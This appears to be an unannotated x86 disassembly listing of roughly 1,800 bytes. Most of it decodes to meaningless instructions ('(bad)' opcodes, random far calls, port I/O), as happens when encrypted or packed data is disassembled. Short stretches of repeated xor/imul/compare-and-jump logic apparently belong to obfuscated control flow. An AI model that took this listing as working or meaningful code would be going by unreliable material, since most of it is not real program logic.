  40b269:	ss popa 
  40b26b:	enter  0x1b45,0x54
  40b26f:	popf   
  40b270:	mov    esp,0x36e7acc8
  40b275:	(bad)  [ecx]
  40b277:	mov    ds:0xcbfc5be0,al
  40b27c:	jne    0x40b269
  40b27e:	xlat   BYTE PTR ds:[ebx]
  40b27f:	mov    DWORD PTR fs:[esi],esi
  40b282:	leave  
  40b283:	sbb    edi,ebx
  40b285:	ficom  WORD PTR [ebp-0x6b]
  40b288:	pop    eax
  40b289:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b28a:	jns    0x40b2c2
  40b28c:	dec    ebp
  40b28d:	fld    QWORD PTR [ecx]
  40b28f:	jae    0x40b2a5
  40b291:	fwait
  40b292:	jno    0x40b2a0
  40b294:	pop    ss
  40b295:	ins    BYTE PTR es:[edi],dx
  40b296:	inc    eax
  40b297:	xchg   esp,eax
  40b298:	mov    dl,0xef
  40b29a:	mov    al,0xbc
  40b29c:	mov    ebx,0x27aa8a82
  40b2a1:	(bad)  
  40b2a2:	retf   
  40b2a3:	push   ebp
  40b2a4:	push   ds
  40b2a5:	mov    al,0xa
  40b2a7:	(bad)  
  40b2a8:	pop    esp
  40b2a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b2aa:	fs aam 0xbd
  40b2ad:	shl    BYTE PTR [edi-0x5036de1a],cl
  40b2b3:	in     eax,0x15
  40b2b5:	stos   BYTE PTR es:[edi],al
  40b2b6:	shl    DWORD PTR [ebx-0x68],1
  40b2b9:	arpl   sp,sp
  40b2bb:	into   
  40b2bc:	pop    eax
  40b2bd:	adc    eax,0x749a527b
  40b2c2:	xchg   edx,eax
  40b2c3:	call   0x6400:0xbcf090bc
  40b2ca:	cli    
  40b2cb:	ret    0x534a
  40b2ce:	das    
  40b2cf:	mov    ah,0xde
  40b2d1:	nop
  40b2d2:	fbld   TBYTE PTR [ebx+0x533e231]
  40b2d8:	mov    ds:0x2b25b27,al
  40b2dd:	xor    bl,ch
  40b2df:	fstp   DWORD PTR [eax*1-0x6b23d4ee]
  40b2e6:	shr    cl,cl
  40b2e8:	repz or eax,0x7bf2c690
  40b2ee:	cmp    al,0xd3
  40b2f0:	dec    edi
  40b2f1:	test   eax,0xb348ef2
  40b2f6:	sbb    cl,BYTE PTR [esi+ebx*1-0x48]
  40b2fa:	pusha  
  40b2fb:	mov    cl,0xe3
  40b2fd:	pop    ecx
  40b2fe:	test   eax,0x7572a3a5
  40b303:	jo     0x40b2a3
  40b305:	aas    
  40b306:	ss mov eax,0xb6fa64f6
  40b30d:	mov    ebx,0x8f29ccae
  40b312:	int    0xb0
  40b314:	sub    BYTE PTR [edi-0x346bff3d],ch
  40b31a:	(bad)  
  40b31d:	cmp    dh,BYTE PTR [eax]
  40b31f:	cmp    eax,0xc383394f
  40b324:	mov    ds:0x40e3c7a7,al
  40b329:	xor    al,0xd0
  40b32b:	(bad)  
  40b32c:	sbb    eax,0x8a995f9f
  40b331:	add    edi,DWORD PTR [ebp+0x25db8b44]
  40b337:	les    esp,FWORD PTR [eax-0x1eea394e]
  40b33d:	ins    DWORD PTR es:[edi],dx
  40b33e:	mov    ecx,0xfb43cdaa
  40b343:	push   0x55
  40b345:	das    
  40b346:	call   0xa97540b7
  40b34b:	pop    eax
  40b34c:	or     eax,0x19a47601
  40b351:	push   edx
  40b352:	ja     0x40b328
  40b354:	sbb    eax,0xa996a418
  40b359:	push   ds
  40b35a:	clc    
  40b35b:	add    al,0xe8
  40b35d:	jecxz  0x40b352
  40b35f:	bound  ebx,QWORD PTR [esi+eax*8]
  40b362:	test   al,0xc9
  40b364:	hlt    
  40b365:	pop    ds
  40b366:	mov    ebp,0xebed4926
  40b36b:	ror    BYTE PTR [ebp-0x26],0xe1
  40b36f:	fs xchg ebp,eax
  40b371:	test   al,0x6c
  40b373:	sbb    ebx,DWORD PTR [esi+0x5]
  40b376:	stc    
  40b377:	fdivr  QWORD PTR [eax+0x7]
  40b37a:	outs   dx,BYTE PTR ds:[esi]
  40b37b:	xchg   ebp,eax
  40b37c:	out    0xfc,ax
  40b37f:	mov    ebx,0xbaf7b109
  40b384:	dec    eax
  40b385:	mov    ds:0x7cdf5af9,eax
  40b38a:	jecxz  0x40b37c
  40b38c:	out    dx,al
  40b38d:	icebp  
  40b38e:	dec    ebp
  40b38f:	jl     0x40b354
  40b391:	jle    0x40b3d7
  40b393:	push   edx
  40b394:	pop    DWORD PTR [edi+0x41]
  40b397:	and    ebp,DWORD PTR [eax+0x78]
  40b39a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b39b:	inc    esp
  40b39c:	cdq    
  40b39d:	sti    
  40b39e:	cmp    al,0xf1
  40b3a0:	push   eax
  40b3a1:	lods   eax,DWORD PTR ds:[esi]
  40b3a2:	xchg   esi,eax
  40b3a3:	(bad)
  40b3a6:	imul   esp,esp,0x15c82a5f
  40b3ac:	scas   al,BYTE PTR es:[edi]
  40b3ad:	mov    BYTE PTR [edx],cl
  40b3af:	leave  
  40b3b0:	mov    edi,0x9f3eee2
  40b3b5:	or     al,BYTE PTR [edi]
  40b3b7:	sbb    BYTE PTR [ecx-0x1fb90add],0x8a
  40b3be:	add    DWORD PTR [edx],esp
  40b3c0:	cs ja  0x40b3ed
  40b3c3:	fwait
  40b3c4:	add    DWORD PTR [edx-0x111175e0],eax
  40b3ca:	adc    ah,BYTE PTR [edx+0x2e4debf4]
  40b3d0:	jecxz  0x40b352
  40b3d2:	jl     0x40b3ef
  40b3d4:	popa   
  40b3d5:	mov    edx,0xbaec8cd
  40b3da:	mov    al,ds:0xab153a70
  40b3df:	frstor [ebp+edi*1-0xd]
  40b3e3:	je     0x40b40b
  40b3e5:	je     0x40b3c1
  40b3e7:	fidiv  WORD PTR [ebx+esi*2+0x9]
  40b3eb:	sub    DWORD PTR [esi+0x6c986d33],esi
  40b3f1:	sub    ah,bl
  40b3f3:	add    bh,BYTE PTR ds:0xf8d26367
  40b3f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3fa:	adc    ah,0x39
  40b3fd:	call   0xa3008e39
  40b402:	test   eax,0x538a98cc
  40b407:	sub    BYTE PTR [esi-0x59de2c59],al
  40b40d:	jnp    0x40b420
  40b40f:	sahf   
  40b410:	jns    0x40b3e2
  40b412:	mov    ch,0x93
  40b414:	mov    ecx,0x7d86ca3d
  40b419:	xor    al,0xd6
  40b41b:	es push ds
  40b41d:	into   
  40b41e:	mov    ah,0x74
  40b420:	pop    ecx
  40b421:	jo     0x40b3f6
  40b423:	jg     0x40b3ee
  40b425:	cmp    al,0xff
  40b427:	xchg   ah,dh
  40b429:	imul   ebx,DWORD PTR [ecx-0x5bf709b4],0x65d248df
  40b433:	mov    bl,ah
  40b435:	pushf  
  40b436:	pop    esi
  40b437:	ss out 0xcd,eax
  40b43a:	(bad)  
  40b43b:	repnz pop edi
  40b43d:	jo     0x40b466
  40b43f:	cmp    cl,BYTE PTR [ebp+0x220963dc]
  40b445:	out    dx,al
  40b446:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b447:	gs cdq 
  40b449:	sar    DWORD PTR [ebx],0x66
  40b44c:	fistp  QWORD PTR [edi]
  40b44e:	fsub   st(5),st
  40b450:	pop    edi
  40b451:	fdiv   DWORD PTR [ecx-0x69]
  40b454:	push   ecx
  40b455:	jb     0x40b490
  40b457:	jg     0x40b41a
  40b459:	push   ebx
  40b45a:	hlt    
  40b45b:	es add al,0xd9
  40b45e:	dec    esp
  40b45f:	add    al,0x4a
  40b461:	into   
  40b462:	stos   DWORD PTR es:[edi],eax
  40b463:	and    eax,DWORD PTR [eax+0x7fa5131f]
  40b469:	dec    ebp
  40b46a:	xor    DWORD PTR [edx+0x3f876447],ecx
  40b470:	mov    BYTE PTR [ebx+0xaf29833],bh
  40b476:	sub    DWORD PTR [esi+edi*4-0x42],esi
  40b47a:	test   BYTE PTR [edi+0x77cd2f08],0xb4
  40b481:	jle    0x40b429
  40b483:	mov    esi,DWORD PTR [edi+0x2f038ebb]
  40b489:	out    0x32,eax
  40b48b:	(bad)  
  40b48c:	mov    WORD PTR [esi],?
  40b48e:	inc    edi
  40b48f:	ret    0x67b1
  40b492:	and    esi,DWORD PTR [ebx]
  40b494:	mov    ecx,DWORD PTR [esi-0x16]
  40b497:	dec    ecx
  40b498:	scas   eax,DWORD PTR es:[edi]
  40b499:	enter  0x7d19,0xd9
  40b49d:	fucomi st,st(4)
  40b49f:	(bad)  
  40b4a0:	cmp    DWORD PTR [ebx],ebp
  40b4a2:	push   ecx
  40b4a3:	pop    ebx
  40b4a4:	adc    al,0x9e
  40b4a6:	xor    bh,BYTE PTR [ebx+0x43]
  40b4a9:	inc    edi
  40b4aa:	sahf   
  40b4ab:	mov    ah,0x26
  40b4ad:	push   DWORD PTR [edx-0x1c8ba668]
  40b4b3:	jnp    0x40b4e5
  40b4b5:	pop    DWORD PTR [ecx]
  40b4b7:	mov    bl,0x46
  40b4b9:	adc    dh,BYTE PTR [ecx]
  40b4bb:	outs   dx,DWORD PTR ds:[esi]
  40b4bc:	and    al,0xc4
  40b4be:	out    0x53,al
  40b4c0:	dec    edi
  40b4c1:	aas    
  40b4c2:	jge    0x40b49d
  40b4c4:	sub    BYTE PTR [eax-0xf],ch
  40b4c7:	and    DWORD PTR [edi-0x161d6542],edx
  40b4cd:	jae    0x40b4ed
  40b4cf:	sahf   
  40b4d0:	jne    0x40b473
  40b4d2:	dec    esp
  40b4d3:	mov    bl,BYTE PTR [edi]
  40b4d5:	adc    cl,BYTE PTR ds:0xb0de84d9
  40b4db:	sbb    al,0x97
  40b4dd:	xor    al,bh
  40b4df:	push   esi
  40b4e0:	push   esi
  40b4e1:	mov    ecx,0xa1205ab9
  40b4e6:	int3   
  40b4e7:	push   cs
  40b4e8:	or     bh,BYTE PTR [eax+0x661683e7]
  40b4ee:	sti    
  40b4ef:	sub    al,0x1c
  40b4f1:	xchg   esp,eax
  40b4f2:	enter  0x622e,0x9c
  40b4f6:	mov    edx,0x9a39d2ad
  40b4fb:	mov    ebx,0x23bb23d4
  40b500:	or     al,0xf3
  40b502:	outs   dx,BYTE PTR ds:[esi]
  40b503:	inc    ecx
  40b504:	sub    BYTE PTR [edi],0x1a
  40b507:	xor    ch,BYTE PTR [edx-0x48b15966]
  40b50d:	popf   
  40b50e:	add    bl,ah
  40b510:	jle    0x40b4a8
  40b512:	(bad)  
  40b513:	mov    WORD PTR [edi-0x47],es
  40b516:	xor    al,0x26
  40b518:	into   
  40b519:	popf   
  40b51a:	inc    ebp
  40b51b:	mov    ebx,0xacab48c9
  40b520:	imul   edx,edi
  40b523:	mov    edi,DWORD PTR [ebp-0x8]
  40b526:	mov    ebx,DWORD PTR [ebp-0x10]
  40b529:	sub    ebx,edi
  40b52b:	cmp    ebx,edx
  40b52d:	ja     0x40b53b
  40b533:	mov    edx,DWORD PTR [ebp-0x2c]
  40b536:	jmp    0x40c0ee
  40b53b:	mov    edx,DWORD PTR [ebp-0x34]
  40b53e:	jmp    0x40b8fc
  40b543:	cmp    eax,0x7178931c
  40b548:	mov    bh,0x49
  40b54a:	loope  0x40b546
  40b54c:	loop   0x40b5b2
  40b54e:	pop    edx
  40b54f:	mov    esi,0xc183fba9
  40b554:	xchg   BYTE PTR [eax+0x70],dh
  40b557:	lahf   
  40b558:	jge    0x40b5ca
  40b55a:	jo     0x40b576
  40b55c:	and    ebx,DWORD PTR [ebp+0x1a]
  40b55f:	cmp    al,0x44
  40b561:	test   al,0xfe
  40b563:	in     eax,0xb6
  40b565:	cmp    esp,DWORD PTR [eax-0x13]
  40b568:	cmp    DWORD PTR [ecx-0x57b6721a],ebx
  40b56e:	pop    ecx
  40b56f:	adc    BYTE PTR [ecx],bh
  40b571:	push   ecx
  40b572:	lods   al,BYTE PTR ds:[esi]
  40b573:	out    dx,al
  40b574:	enter  0x6fa8,0xea
  40b578:	pop    esp
  40b579:	push   esp
  40b57a:	retf   
  40b57b:	mov    bl,0x8f
  40b57d:	mov    ds,WORD PTR [edi+0x27]
  40b580:	in     eax,0x6d
  40b582:	xor    eax,0x34c51d4d
  40b587:	dec    esi
  40b588:	dec    eax
  40b589:	inc    ecx
  40b58a:	mov    al,ds:0xe9ef9bbb
  40b58f:	loop   0x40b5a5
  40b591:	sub    eax,0xf87b436
  40b596:	call   0x3cd3:0x9f4ef2d2
  40b59d:	lock es ins DWORD PTR es:[edi],dx
  40b5a0:	daa    
  40b5a1:	dec    edi
  40b5a2:	int    0xbc
  40b5a4:	mov    ecx,0x717fa885
  40b5a9:	int3   
  40b5aa:	mov    eax,0x957eae2a
  40b5af:	fst    st(1)
  40b5b1:	fld    TBYTE PTR [esp+ebx*4]
  40b5b4:	pushf  
  40b5b5:	inc    esi
  40b5b6:	pop    edi
  40b5b7:	mov    edi,0x202e7a2a
  40b5bc:	dec    BYTE PTR [eax]
  40b5be:	test   al,0xdc
  40b5c1:	sbb    DWORD PTR [ebx+0x5802abf3],ecx
  40b5c7:	lds    edx,FWORD PTR [ebp+0x68]
  40b5ca:	shr    bh,1
  40b5cc:	aaa    
  40b5cd:	js     0x40b5a4
  40b5cf:	push   ebx
  40b5d0:	rol    edx,cl
  40b5d2:	xor    DWORD PTR [ebx],edx
  40b5d4:	sbb    al,0x5d
  40b5d6:	jmp    0xe0c338cd
  40b5db:	mov    ch,0x25
  40b5dd:	aam    0x42
  40b5df:	dec    ebx
  40b5e0:	(bad)  
  40b5e1:	stos   DWORD PTR es:[edi],eax
  40b5e2:	xchg   esi,eax
  40b5e3:	aam    0xfa
  40b5e5:	pop    edx
  40b5e6:	ins    DWORD PTR es:[edi],dx
  40b5e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5e9:	jge    0x40b5cd
  40b5eb:	xchg   edi,eax
  40b5ec:	loope  0x40b59f
  40b5ee:	xor    eax,ebx
  40b5f0:	xchg   ebx,eax
  40b5f1:	into   
  40b5f2:	push   ss
  40b5f3:	repz shl ecx,0x52
  40b5f7:	cdq    
  40b5f8:	inc    eax
  40b5f9:	repnz (bad) [edx-0x4e]
  40b5fd:	or     edx,DWORD PTR [esi+0x320c2d15]
  40b603:	addr16 adc al,0x8
  40b606:	xchg   edi,eax
  40b607:	dec    edi
  40b608:	and    BYTE PTR [edx],dh
  40b60a:	push   ds
  40b60b:	or     ah,BYTE PTR [edx]
  40b60d:	mov    al,0x29
  40b60f:	mov    dl,0x58
  40b611:	sub    al,0x1a
  40b613:	mov    ds:0x326c40ff,eax
  40b618:	xchg   ebx,eax
  40b619:	cmp    edx,DWORD PTR [edx+0x69]
  40b61c:	jne    0x40b5f8
  40b61e:	mov    al,0x6a
  40b620:	pop    ecx
  40b621:	mov    BYTE PTR [ebx+0x62],ah
  40b624:	(bad)  
  40b625:	dec    ebx
  40b626:	add    DWORD PTR [edi],edi
  40b628:	and    BYTE PTR [edx],ch
  40b62a:	xchg   ch,cl
  40b62c:	or     esi,edx
  40b62e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b62f:	pusha  
  40b630:	inc    esi
  40b631:	fldcw  WORD PTR ds:0xb9cf3d11
  40b637:	cs pop esp
  40b639:	out    0x48,eax
  40b63b:	jne    0x40b65b
  40b63d:	and    eax,0xf45aef6c
  40b642:	dec    ecx
  40b643:	popf   
  40b644:	arpl   WORD PTR [eax+0x10],di
  40b647:	retf   0x14af
  40b64a:	pop    ss
  40b64b:	fcomp  QWORD PTR [edx]
  40b64d:	fsub   DWORD PTR [esi+eax*8-0x621b1202]
  40b654:	and    bl,BYTE PTR [edi]
  40b656:	mov    edx,DWORD PTR [edx+0x6b]
  40b659:	cmp    eax,0x9f07caf4
  40b65e:	repz fwait
  40b660:	sahf   
  40b661:	jecxz  0x40b6ae
  40b663:	scas   al,BYTE PTR es:[edi]
  40b664:	ficom  WORD PTR [esi]
  40b666:	sbb    al,0xf9
  40b668:	retf   
  40b669:	cdq    
  40b66a:	inc    ecx
  40b66b:	repz icebp 
  40b66d:	adc    dl,dl
  40b66f:	pop    esi
  40b670:	daa    
  40b671:	pop    edx
  40b672:	dec    eax
  40b673:	mul    dh
  40b675:	dec    esp
  40b676:	mov    ebp,0x112864e
  40b67b:	dec    ecx
  40b67c:	test   BYTE PTR [esi+0x3c],dh
  40b67f:	lods   eax,DWORD PTR ds:[esi]
  40b680:	push   eax
  40b681:	ss out 0x31,al
  40b684:	test   DWORD PTR [edx],esp
  40b686:	or     ah,BYTE PTR [esi+0x5d]
  40b689:	xchg   esi,eax
  40b68a:	stos   DWORD PTR es:[edi],eax
  40b68b:	data16 mov bh,0x8d
  40b68e:	jle    0x40b64e
  40b690:	repnz mov ds:0x6023d176,al
  40b696:	enter  0x9f05,0x63
  40b69a:	mov    gs,ebx
  40b69c:	pop    ecx
  40b69d:	xchg   esi,eax
  40b69e:	fstp   TBYTE PTR [ecx+esi*4]
  40b6a1:	fistp  DWORD PTR [eax]
  40b6a3:	lock repnz xchg cl,cl
  40b6a7:	jl     0x40b67c
  40b6a9:	out    0x17,al
  40b6ab:	out    0x8b,eax
  40b6ad:	das    
  40b6ae:	sub    al,0x1a
  40b6b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b6b1:	push   es
  40b6b2:	pop    ebp
  40b6b3:	xchg   BYTE PTR ds:0x2aafa01b,bl
  40b6b9:	pop    eax
  40b6ba:	mov    esi,0xaa05374d
  40b6bf:	shl    BYTE PTR [esi+0x65],cl
  40b6c2:	lods   al,BYTE PTR ds:[esi]
  40b6c3:	fcom   QWORD PTR [ecx+0x74]
  40b6c6:	dec    ebp
  40b6c7:	adc    esp,0x3dea6f5c
  40b6cd:	push   edx
  40b6ce:	popf   
  40b6cf:	adc    BYTE PTR [edi-0x1b],ah
  40b6d2:	add    ah,ah
  40b6d4:	ins    BYTE PTR es:[edi],dx
  40b6d5:	xor    eax,0xbbbc41ac
  40b6da:	cmp    al,0xa0
  40b6dc:	xor    eax,esi
  40b6de:	jbe    0x40b694
  40b6e0:	into   
  40b6e1:	xchg   BYTE PTR [eax-0x7ea90133],bh
  40b6e7:	loope  0x40b74c
  40b6e9:	(bad)  
  40b6ea:	inc    eax
  40b6eb:	push   ebp
  40b6ec:	icebp  
  40b6ed:	mov    esp,0x1a644db
  40b6f2:	into   
  40b6f3:	jecxz  0x40b67f
  40b6f5:	sbb    eax,0x73764812
  40b6fa:	push   edx
  40b6fb:	(bad)  
  40b6fc:	into   
  40b6fd:	out    0xa7,al
  40b6ff:	sub    al,0xa2
  40b701:	les    esi,FWORD PTR [edx]
  40b703:	jge    0x40b6bf
  40b705:	sbb    ecx,DWORD PTR [edi-0x7fb5fb33]
  40b70b:	adc    BYTE PTR [edx+0x21fa8ec4],bh
  40b711:	pop    ebp
  40b712:	mov    ds,ebx
  40b714:	out    0xf1,eax
  40b716:	xlat   BYTE PTR ds:[ebx]
  40b717:	jmp    0x8f2e2593
  40b71c:	dec    ecx
  40b71d:	in     al,dx
  40b71e:	cwde   
  40b71f:	daa    
  40b720:	jae    0x40b706
  40b722:	and    ch,ch
  40b724:	mov    dl,0xa0
  40b726:	aam    0xca
  40b728:	stos   DWORD PTR es:[edi],eax
  40b729:	pop    ebp
  40b72a:	push   cs
  40b72b:	addr16 mov eax,ds:0x8597
  40b72f:	mov    eax,0x7f2ed3b3
  40b734:	add    al,0x8d
  40b736:	xor    DWORD PTR [eax],ebx
  40b738:	stc    
  40b739:	js     0x40b7a4
  40b73b:	addr16 cli 
  40b73d:	sti    
  40b73e:	or     BYTE PTR [esi-0x6c],cl
  40b741:	imul   eax,DWORD PTR [esi-0x16cbac11],0x62c66272
  40b74b:	(bad)  
  40b74c:	cwde   
  40b74d:	stos   BYTE PTR es:[edi],al
  40b74e:	(bad)  
  40b750:	test   BYTE PTR ds:0x3228974f,ch
  40b756:	xchg   esi,eax
  40b757:	in     eax,0xd
  40b759:	xlat   BYTE PTR ds:[ebx]
  40b75a:	or     al,0x82
  40b75c:	pop    esi
  40b75d:	sbb    eax,0xd994f0f1
  40b762:	jge    0x40b745
  40b764:	fidiv  DWORD PTR [edi]
  40b766:	cwde   
  40b767:	and    cl,BYTE PTR [eax+0x71a9e5b3]
  40b76d:	ds mov ebp,0x4a1b7d95
  40b773:	dec    eax
  40b774:	xlat   BYTE PTR ds:[ebx]
  40b775:	push   eax
  40b776:	mov    edi,0x28464913
  40b77b:	fs jbe 0x40b7bf
  40b77e:	fiadd  WORD PTR [ecx-0x7f]
  40b781:	mov    edx,0x8fd55a34
  40b786:	cmc    
  40b787:	and    al,0x16
  40b789:	cli    
  40b78a:	push   ebx
  40b78b:	add    DWORD PTR [edi-0x79],edi
  40b78e:	sti    
  40b78f:	and    DWORD PTR [esi-0x75],edx
  40b792:	push   esi
  40b793:	icebp  
  40b794:	fbstp  TBYTE PTR [ecx+0x67]
  40b797:	int3   
  40b798:	cmp    ecx,ecx
  40b79a:	push   ecx
  40b79b:	mov    ebp,0xd2e7ae6e
  40b7a0:	cld    
  40b7a1:	sbb    ch,BYTE PTR [ebx+ebx*4-0x77]
  40b7a5:	jbe    0x40b74f
  40b7a7:	adc    BYTE PTR [edx+edi*1-0x4c],cl
  40b7ab:	scas   eax,DWORD PTR es:[edi]
  40b7ac:	mov    edi,0x6f02286c
  40b7b1:	jne    0x40b82a
  40b7b3:	push   edx
  40b7b4:	call   0xde72:0xbeed0ecd
  40b7bb:	sub    DWORD PTR [edx],ebp
  40b7bd:	mov    ch,0x8b
  40b7bf:	stos   DWORD PTR es:[edi],eax
  40b7c0:	and    dl,BYTE PTR [esi]
  40b7c2:	mov    dh,0x2
  40b7c4:	cs inc ebx
  40b7c6:	lds    ebx,FWORD PTR [edx+0x370993e0]
  40b7cc:	xor    DWORD PTR ds:0xe9301b6a,ebp
  40b7d2:	scas   eax,DWORD PTR es:[edi]
  40b7d3:	and    eax,edi
  40b7d5:	imul   DWORD PTR [esi-0x73]
  40b7d8:	rcl    BYTE PTR [edx+0x56],0x90
  40b7dc:	std    
  40b7dd:	dec    eax
  40b7de:	jl     0x40b814
  40b7e0:	mov    dl,0x7e
  40b7e2:	cmp    al,0x1c
  40b7e4:	mov    ebp,0x664e8597
  40b7e9:	push   es
  40b7ea:	or     eax,0xd541d865
  40b7ef:	rcl    BYTE PTR [eax],1
  40b7f1:	sahf   
  40b7f2:	push   ds
  40b7f3:	xor    edi,0xffffff8d
  40b7f6:	add    ah,BYTE PTR [esi]
  40b7f8:	mov    esp,esp
  40b7fa:	jge    0x40b796
  40b7fc:	or     esi,edi
  40b7fe:	sub    eax,0x88ea7b7
  40b803:	lods   al,BYTE PTR ds:[esi]
  40b804:	and    dh,BYTE PTR [edx+0x5ad03c0d]
  40b80a:	fdiv   DWORD PTR [ebp-0x7b285e59]
  40b810:	mov    ah,0x1a
  40b812:	test   eax,ebp
  40b814:	arpl   WORD PTR [edi-0x7c],ax
  40b817:	loopne 0x40b7bc
  40b819:	dec    ecx
  40b81a:	std    
  40b81b:	or     eax,0xa62f15d
  40b820:	outs   dx,DWORD PTR ds:[esi]
  40b821:	ja     0x40b828
  40b823:	cmp    al,0x66
  40b825:	aaa    
  40b826:	sub    ebx,DWORD PTR [ebx]
  40b828:	(bad)  
  40b829:	jmp    0x40b7fb
  40b82b:	aad    0x85
  40b82d:	clc    
  40b82e:	jle    0x40b7fd
  40b830:	popf   
  40b831:	mov    al,ds:0xc30f7419
  40b836:	pop    esi
  40b837:	icebp  
  40b838:	fisub  DWORD PTR [ebx+0x5620b01b]
  40b83e:	jno    0x40b865
  40b840:	popfw  
  40b842:	enter  0xc74b,0xcb
  40b846:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b847:	pusha  
  40b848:	push   eax
  40b849:	stc    
  40b84a:	std    
  40b84b:	add    BYTE PTR [edx+eiz*2],ch
  40b84e:	add    esi,edi
  40b850:	loopne 0x40b88e
  40b852:	mov    edx,0xc4dbe244
  40b857:	xchg   edi,eax
  40b858:	les    esp,FWORD PTR [ecx-0x2e]
  40b85b:	adc    al,0xa9
  40b85d:	mov    al,0x60
  40b85f:	es jmp 0x40b82a
  40b862:	out    0xb8,eax
  40b864:	outs   dx,BYTE PTR ds:[esi]
  40b865:	in     al,dx
  40b866:	retf   
  40b867:	pushf  
  40b868:	jg     0x40b7f1
  40b86a:	push   cs
  40b86b:	mov    edx,0xb3f5dbe3
  40b870:	or     eax,0x99488799
  40b875:	shr    BYTE PTR [eax],cl
  40b877:	or     dh,cl
  40b879:	in     al,dx
  40b87a:	out    dx,al
  40b87b:	int3   
  40b87c:	cwde   
  40b87d:	(bad)  
  40b87e:	or     bl,BYTE PTR [esi+0x4f]
  40b881:	aam    0x2d
  40b883:	and    dl,ch
  40b885:	popf   
  40b886:	cwde   
  40b887:	loop   0x40b871
  40b889:	fst    DWORD PTR [esi]
  40b88b:	test   eax,0xce5214c0
  40b890:	mov    ah,0x5c
  40b892:	cwde   
  40b893:	push   esp
  40b894:	xchg   esp,eax
  40b895:	loop   0x40b8cc
  40b897:	xchg   DWORD PTR [ebx],ecx
  40b899:	ja     0x40b895
  40b89b:	dec    eax
  40b89c:	cld    
  40b89d:	sub    BYTE PTR [edi-0x3bdd0219],ch
  40b8a3:	or     BYTE PTR [ebx-0x27],0x74
  40b8a7:	mov    ax,ds:0x794a2da1
  40b8ad:	and    al,0xc
  40b8af:	dec    eax
  40b8b0:	mov    al,ds:0xb3119888
  40b8b5:	enter  0x725e,0x5a
  40b8b9:	cli    
  40b8ba:	push   esi
  40b8bb:	iret   
  40b8bc:	push   ebp
  40b8bd:	ret    
  40b8be:	leave  
  40b8bf:	lods   al,BYTE PTR ds:[esi]
  40b8c0:	dec    esi
  40b8c1:	inc    ebx
  40b8c2:	aad    0xcb
  40b8c4:	jae    0x40b8f6
  40b8c6:	iret   
  40b8c7:	xor    al,BYTE PTR [eax+0x2]
  40b8ca:	dec    esi
  40b8cb:	pop    eax
  40b8cc:	(bad)
  40b8cf:	sub    ah,BYTE PTR [ecx+0x3e63fb48]
  40b8d5:	jnp    0x40b8bf
  40b8d7:	push   0x2a
  40b8d9:	cmc    
  40b8da:	jmp    0x92e9c31d
  40b8df:	es push ebp
  40b8e1:	(bad)  
  40b8e2:	mov    edx,0x2a9309ce
  40b8e7:	jno    0x40b948
  40b8e9:	mov    WORD PTR [ebp+0x1cd994c3],?
  40b8ef:	pop    esp
  40b8f0:	pushf  
  40b8f1:	outs   dx,DWORD PTR ds:[esi]
  40b8f2:	jo     0x40b8f3
  40b8f4:	jno    0x40b8d5
  40b8f6:	repz cmp eax,0xf7d7c82f
  40b8fc:	mov    edi,DWORD PTR [ebp-0x4]
  40b8ff:	xor    edx,eax
  40b901:	xor    edi,eax
  40b903:	add    edi,ecx
  40b905:	add    edx,ecx
  40b907:	imul   edx,edi
  40b90a:	mov    edi,DWORD PTR [ebp-0x8]
  40b90d:	mov    ebx,DWORD PTR [ebp-0x10]
  40b910:	sub    ebx,edi
  40b912:	cmp    ebx,edx
  40b914:	ja     0x40b922
  40b91a:	mov    edx,DWORD PTR [ebp-0x30]
  40b91d:	jmp    0x40c0ee
  40b922:	mov    edx,DWORD PTR [ebp-0x38]
  40b925:	mov    edi,DWORD PTR [ebp-0x4]
  40b928:	xor    edx,eax
  40b92a:	xor    edi,eax
  40b92c:	add    edi,ecx
  40b92e:	add    edx,ecx
  40b930:	imul   edx,edi
  40b933:	mov    edi,DWORD PTR [ebp-0x8]
  40b936:	jmp    0x40bcf4
  40b93b:	xchg   ebp,eax
  40b93c:	fcomi  st,st(6)
  40b93e:	push   esi
  40b93f:	jb     0x40b992
  40b941:	mov    ch,0xdb
  40b943:	shl    BYTE PTR [ebx-0x7aee9905],cl
  40b949:	adc    BYTE PTR [edi+0x60],dl
  40b94c:	xor    DWORD PTR [eax+0x70],0xffffff9f
  40b950:	jge    0x40b9c2
  40b952:	jo     0x40b94c
  40b954:	cmc    
  40b955:	jp     0x40b9c9
  40b957:	or     al,0x27
  40b959:	xchg   esp,eax
  40b95a:	(bad)  
  40b95d:	fldcw  WORD PTR [eax+esi*2]
  40b960:	mov    ebp,0x61abe9dd
  40b965:	dec    esi
  40b966:	dec    edi
  40b967:	fisttp WORD PTR [ecx]
  40b969:	jp     0x40b90d
  40b96b:	push   ds
  40b96c:	jl     0x40b93d
  40b96e:	push   ebx
  40b96f:	stos   DWORD PTR es:[edi],eax
  40b970:	dec    esp
  40b971:	and    eax,0xbdcc94a7
  40b976:	or     BYTE PTR [esi],al
  40b978:	add    al,0xc8
  40b97a:	xor    dh,BYTE PTR [edi]
  40b97c:	sub    ah,ch
  40b97e:	daa    
  40b97f:	mov    eax,0xabeb7bcc
  40b984:	retf   
  40b985:	mov    ah,0xc7
  40b987:	pop    eax
  40b988:	lods   eax,DWORD PTR ds:[esi]
  40b989:	or     BYTE PTR [edx],cl
  40b98b:	and    BYTE PTR ds:0x82dec558,dh
  40b991:	(bad)  
  40b992:	fwait
  40b993:	pop    edi
  40b994:	aad    0xb5
  40b996:	sahf   
  40b997:	(bad)  
  40b998:	xchg   esp,eax
  40b999:	daa    
  40b99a:	mov    bl,0x5f
  40b99c:	xchg   ecx,eax
  40b99d:	or     BYTE PTR [ecx-0x1d64505],bh
  40b9a3:	pop    eax
  40b9a4:	loop   0x40b949
  40b9a6:	ja     0x40ba26
  40b9a8:	arpl   WORD PTR [ecx-0x71],bp
  40b9ab:	popf   
  40b9ac:	fist   DWORD PTR [edi+0x79]
  40b9af:	fucom  st(6)
  40b9b1:	inc    edx
  40b9b2:	les    edx,FWORD PTR [edx+edx*2]
